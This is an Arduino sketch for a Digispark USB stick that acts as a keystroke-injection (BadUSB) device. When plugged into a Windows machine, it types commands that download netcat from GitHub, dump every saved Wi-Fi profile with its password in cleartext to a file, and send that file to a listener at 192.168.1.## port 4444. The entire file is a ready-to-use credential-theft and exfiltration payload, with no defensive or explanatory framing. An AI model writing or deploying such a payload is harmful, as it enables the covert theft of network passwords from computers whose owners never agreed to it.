
#define kbd_tr_tr
#include "DigiKeyboard.h"
void setup() {
// put your setup code here, to run once:
}
void loop() {
// put your main code here, to run repeatedly:
DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.delay(100);
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
DigiKeyboard.delay(100);
DigiKeyboard.print("powershell");
DigiKeyboard.delay(100);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(100);
DigiKeyboard.print("Start-BitsTransfer https://github.com/int0x33/nc.exe/raw/master/nc64.exe nc64.exe");
DigiKeyboard.delay(100);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(5000);
DigiKeyboard.print("exit");
DigiKeyboard.delay(250);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(250);
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
DigiKeyboard.delay(250);
DigiKeyboard.print("cmd");
DigiKeyboard.delay(250);
DigiKeyboard.sendKeyStroke(KEY_ENTER);

DigiKeyboard.delay(1000);
DigiKeyboard.print("netsh wlan show profile * key=clear >> a.txt");
DigiKeyboard.delay(250);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.print("nc64.exe -w 5 192.168.1.## 4444 < a.txt");
DigiKeyboard.delay(250);
DigiKeyboard.sendKeyStroke(KEY_ENTER);

DigiKeyboard.print("exit");
DigiKeyboard.delay(250);
DigiKeyboard.sendKeyStroke(KEY_ENTER);

DigiKeyboard.delay(250);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
for (;;) {
/*Stops the digispark from running the scipt again*/
}
}